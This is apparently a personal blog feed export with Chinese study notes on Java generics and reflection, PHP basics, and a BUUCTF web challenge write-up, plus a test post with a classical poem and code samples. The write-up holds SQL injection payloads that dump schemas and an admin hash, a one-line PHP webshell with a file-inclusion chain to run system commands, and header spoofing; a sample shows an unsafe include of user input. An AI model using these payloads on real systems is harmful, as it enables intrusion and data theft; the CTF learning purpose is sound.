Object</li></ul><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><ul><li>接口中静态成员不能使用泛型</li><li>类型在继承接口或类实现接口时确定</li></ul><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><ul><li><p>带类型参数的方法</p></li><li><p>泛型方法可以定义在泛型和普通类里面。使用泛型的方法未定义泛型</p></li><li><p>可以使用自己声明的泛型，也可以使用类声明的泛型</p></li><li><p>在调用时会确定类型</p></li></ul><h3 id="泛型通配符-“-？”"><a href="#泛型通配符-“-？”" class="headerlink" title="泛型通配符 “ ？”"></a>泛型通配符 “ ？”</h3><ul><li><p>泛型没有继承</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">List&lt;<span class="hljs-built_in">Object</span>&gt; list=<span class="hljs-keyword">new</span> ArrayList&lt;<span class="hljs-built_in">String</span>&gt;();<br></code></pre></td></tr></table></figure></li><li><p><code>&lt;?&gt;</code> : 支持任意泛型类型，任何类型的 List 对象</p></li><li><p><code>&lt;? extends A&gt;</code> : 接受 A 或 A 的子类，规定上限</p></li><li><p><code>&lt;? super A&gt; </code>: A 类或 A 的父类，规定下限</p></li></ul><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><ul><li>在不修改源码时，控制程序，不知道类结构情况下获取类的结构信息</li><li>可以突破访问修饰符的限制</li></ul><h2 id="Class-类的方法"><a href="#Class-类的方法" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><table><thead><tr><th>方法名</th><th>作用描述</th></tr></thead><tbody><tr><td>getName</td><td>获取全类名</td></tr><tr><td>getSimpleName</td><td>获取简单类名</td></tr><tr><td>getSuperClass</td><td>以 Class 形式返回父类信息</td></tr><tr><td>getInterface</td><td>以 Class [ ] 形式返回接口信息</td></tr><tr><td>getFiled &#x2F; getFields</td><td>获取 public 修饰的字段，包含本类和父类</td></tr><tr><td>getDeclaredFiled &#x2F; getDeclaredFileds</td><td>获取本类所有字段</td></tr><tr><td>getMethod &#x2F; getMethods</td><td>获取 public 修饰的方法，包含本类和父类</td></tr><tr><td>getDeclaredMethod &#x2F; getDeclaredMethods</td><td>获取本类所有方法（包括私有）</td></tr><tr><td>getConstructors</td><td>获取本类 public 修饰的构造器</td></tr><tr><td>getDeclearedConstructors</td><td>获取本类所有构造器</td></tr><tr><td>getPackage</td><td>以 Package 形式返回包信息</td></tr><tr><td>getAnnotations</td><td>以 Annotation 形式返回注解信息</td></tr><tr><td>getClass</td><td>得到运行类型</td></tr><tr><td>newInstance</td><td>创建对象</td></tr><tr><td>getClassLoader</td><td>得到类加载器</td></tr><tr><td>forName</td><td>得到类对象</td></tr></tbody></table><h2 id="Class-类对象获取方式"><a href="#Class-类对象获取方式" class="headerlink" title="Class 类对象获取方式"></a>Class 类对象获取方式</h2><ul><li>Class.forName ( … )</li><li>类.class用于参数传递</li><li>对象.getClass ( )</li><li>ClassLoader.loadClass ( … )</li><li>基本数据类型的 Class 类对象获取   int.class    Integer.TYPE</li><li>基本数据类型的 Class 类对象获取    Integer.class</li></ul><h2 id="Class-类对象"><a href="#Class-类对象" class="headerlink" title="Class 类对象"></a>Class 类对象</h2><ul><li>外部类</li><li>成员内部类，静态内部类，局部内部类，匿名内部类</li><li>interface：接口</li><li>数组</li><li>enum：枚举     Thread.State</li><li>annotation：注解</li><li>基本数据类型</li><li>void</li></ul><h2 id="Class-类的方法-1"><a href="#Class-类的方法-1" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><p>反射创造对象</p><ul><li>无参构造器</li><li>有参构造器</li><li>私有构造器</li></ul><p>反射操作属性</p><ul><li>获取属性</li><li>设置属性</li><li>私有属性</li><li>如果是静态属性，第一个参数可以给 null</li></ul><p>反射操作方法</p><ul><li>获取方法<ul><li>getMethod</li></ul></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>java . lang . reflect .Filed 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getType：以 Class 形式返回类型</li><li>getName：返回属性名</li></ul><p>java . lang . reflect . Method 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getReturnType：以 Class 形式获取返回类型</li><li>getName：返回方法名</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li></ul><p>java . lang . reflect . Constructor 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getName：返回构造器名（全类名）</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li><li>newInstance</li></ul><p>差不多就到这了，笔记比较简洁，里面有很多很简单的东西没写，可能篇幅太长了传上来的时候老是有问题，搞了好半天呜呜呜呜呜……</p><p><img src="/2024/11/06/TestWP/q.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 基础(部分)</title>
    <link href="/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/"/>
    <url>/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>如 <code>__FILE__</code> 这样的预定义常量，被称为魔术常量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 返回文件完整的路径和文件名</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//代码高亮显示当前文件内容</span><br><span class="hljs-keyword">__LINE__</span><span class="hljs-comment">// 表示当前行号</span><br><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 表示当前文件名</span><br><span class="hljs-keyword">__DIR__</span><span class="hljs-comment">// 表示当前文件所在的目录</span><br><span class="hljs-keyword">__FUNCTION__</span><span class="hljs-comment">// 表示当前函数名</span><br><span class="hljs-keyword">__CLASS__</span><span class="hljs-comment">// 表示当前类名</span><br><span class="hljs-keyword">__METHOD__</span><span class="hljs-comment">// 表示当前方法名</span><br><span class="hljs-keyword">__NAMESPACE__</span><span class="hljs-comment">// 表示当前命名空间</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>(): 包含并运行指定文件，包含文件发生错误，程序警告，但会继续执行<br><span class="hljs-built_in">include_once</span>(): 检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次<br><span class="hljs-built_in">require</span>(): 包含并运行指定的文件，包含文件发生错误时，程序直接终止执行<br><span class="hljs-built_in">require_once</span>():和 require 类似，不同处在于 require_once 只导入一次<br><span class="hljs-built_in">fopen</span>(): 打开一个文件或 URL<br><span class="hljs-built_in">file_get_contents</span>(): 读取文件的全部内容到一个字符串，例如 <span class="hljs-variable">$content</span> = <span class="hljs-built_in">file_get_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-built_in">file_put_contents</span>(): 将一个字符串写入文件。例如：<span class="hljs-built_in">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(): 将字符串当中php代码来执行，比如: 一句话木马@<span class="hljs-built_in">eval</span>(_POST[<span class="hljs-string">&quot;1&quot;</span>]);<br><span class="hljs-built_in">assert</span>(): 检测执行条件是否为 true<br></code></pre></td></tr></table></figure><p>调用系统底层的4个方法-system , shell_exec , exec , passthru</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">system</span>(): 调用系统底层，执行系统命令，例如 <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); 列出当前目录下所有文件<br><span class="hljs-built_in">shell_exc</span>(): 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br><span class="hljs-built_in">exec</span>():执行一个外部程序<br><span class="hljs-built_in">passthru</span>():执行外部程序并且显示原始输出，当所执行的 Unix<br>命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-built_in">system</span>() 函数<br></code></pre></td></tr></table></figure><h2 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unserialize</span>(): 将一个已序列化的字符串转换回 PHP 的值。例如：<span class="hljs-variable">$array</span> = <span class="hljs-built_in">unserialize</span>(<span class="hljs-variable">$serializedStr</span>); 可以将一个序列化的数组字符串转换为数组。<br></code></pre></td></tr></table></figure><h2 id="数据库操作函数"><a href="#数据库操作函数" class="headerlink" title="数据库操作函数"></a>数据库操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysql_query</span>(), <span class="hljs-built_in">mysqli_query</span>(): 发送一个 MySQL 查询。例如：<span class="hljs-variable">$result</span> = <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM users&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h2><p><strong>preg_match():</strong></p><p>用于进行正则表达式匹配，成功返回 1，否则返回 0。</p><p>注: <code>preg_match() </code>第一次匹配成功后就会停止匹配，如果要实现全部结果的匹配，即搜索到检索对象的结尾处，则需使用 <code>preg_match_all()</code> 函数。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>, <span class="hljs-variable">$matches</span>))<br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was found:&quot;</span>. <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <br>   &#125; <br>   <span class="hljs-keyword">else</span><br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was not found.&quot;</span>; <br>   &#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//A match was found: PHP </span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all():</strong> </p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php">   <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&lt;pre&gt;学习php是一件快乐的事。&lt;/pre&gt;&lt;pre&gt;所有的 phper 需要共同努力！&lt;/pre&gt;&quot;</span>; </span><br><span class="language-php">   <span class="hljs-variable">$kw</span> = <span class="hljs-string">&quot;php&quot;</span>; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;pre&gt;([sS]*?)&lt;/pre&gt;/&#x27;</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$mat</span>); </span><br><span class="language-php">   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>]);<span class="hljs-variable">$i</span>++)</span><br><span class="language-php">   &#123;</span><br><span class="language-php">      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>]; </span><br><span class="language-php">      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$kw</span>, <span class="hljs-string">&#x27;&lt;span style=&quot;color:#ff0000&quot;&gt;&#x27;</span>.<span class="hljs-variable">$kw</span>.<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>, <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]); </span><br><span class="language-php">      <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$str</span>); </span><br><span class="language-php">   &#125; </span><br><span class="language-php">   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; </span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">//将所有 <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span> 标签内的关键字显示为红色</span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all()</strong></p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><p><strong>preg_replace()</strong></p><p> 执行正则表达式搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;butt3rf1y&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\d+/&#x27;</span>;<span class="hljs-comment">// \d+是匹配一个或多个数字</span><br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;R&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// buttRrfRy</span><br></code></pre></td></tr></table></figure><p><strong>preg_split()</strong></p><p>将字符串依指定的规则切开。</p><h1 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h1><p><strong>$_GET</strong></p><p>接受 GET 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">example.com/index.php?<span class="hljs-attribute">bu</span>=butt3rf1y，你可以使用 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>接受 POST 传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/index.php 进行 POST 传参，参数名为 bu 内容为 but3rf1y，可以使用 <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值。<br></code></pre></td></tr></table></figure><p><strong>$_REQUEST</strong></p><p>接受 GET 和 POST 以及 Cookie 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">通过 <span class="hljs-built_in">GET</span> 请求 URL 传递了一个参数 example.com/index.php?<span class="hljs-attribute">key</span>=value_from_get，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>设置了一个名为 key 的 cookie，其值为 value_from_cookie,可以使用 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 来获取这个值。<br></code></pre></td></tr></table></figure><p>有点小累……</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU Basic(1)</title>
    <link href="/2024/11/07/BUUBasic-1/"/>
    <url>/2024/11/07/BUUBasic-1/</url>
    
    <content type="html"><![CDATA[<h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>                                                                                                                                                                                                                                                                                                                                                                          <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p><img src="/2024/11/06/TestWP/c-1/SQL1.png"></p><p>点击 <code>测试新闻1</code> ，f12 查看状态，发现注入点，访问请求网址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 正常回显<br><span class="hljs-attribute">1</span>=2 报错，说明有注入点<br></code></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">2</span>#<br>得到数据库：information_schema,performance_schema,ctftraining,mysql,test,news<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;news&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 news 下的表：<span class="hljs-keyword">admin</span>,contents<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 ctftraining 下的表：FLAG_TABLE,news,users<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 表下的列名：id,username,<span class="hljs-keyword">password</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 users 表下的列名：<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,<span class="hljs-keyword">password</span>,ip,<span class="hljs-type">time</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(username,&quot; &quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 的数据：username=<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">64</span>ebd6a0d676acff2c6bed36e716c9aa<br></code></pre></td></tr></table></figure><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>文件上传，先上传一个一句话木马 11.php ，但是蚁剑连接不了，无论上传什么都会被解析成 <code>.jpg</code> 格式</p><p>后面才知道这有一个文件包含漏洞，文件上传和文件包含结合起来了。</p><p><code>http://4eb012d0-f5b1-4297-907d-54f47dfaddf1.node5.buuoj.cn:81/index.php?file=upload.php</code> 将 <code>upload.php</code> 换成上传的文件的路径，然后对其 post 传参 </p><p>payload：1 是一句话木马的连接密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h2><p>提示只能本地访问，所以bp 抓包进行 <code>X-Forwarded-For</code> 伪造</p><p>然后进行 post 传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=admin&amp;password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TestWP</title>
    <link href="/2024/11/06/TestWP/"/>
    <url>/2024/11/06/TestWP/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章</p><p><img src="/2024/11/06/TestWP/111.png"></p><h1 id="一剪梅·红藕香残玉簟秋"><a href="#一剪梅·红藕香残玉簟秋" class="headerlink" title="一剪梅·红藕香残玉簟秋"></a>一剪梅·红藕香残玉簟秋</h1><p>一剪梅·红藕香残玉簟秋</p><p>李清照</p><p>红藕香残玉簟秋。轻解罗裳，独上兰舟。云中谁寄锦书来？雁字回时，月满西楼。<br>花自飘零水自流。一种相思，两处闲愁。此情无计可消除，才下眉头，却上心头。</p><p>C&#x2F;C++</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i])-i)<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>Java</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Main &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;<br>        Node java= <span class="hljs-built_in">new</span> Node(&quot;java&quot;);<br>        Node rw=<span class="hljs-built_in">new</span> Node(&quot;rw&quot;);<br>        Node urm=<span class="hljs-built_in">new</span> Node(&quot;urm&quot;);<br>        java.next=rw;<br>        rw.next=urm;<br>        <br>        urm.prev=rw;<br>        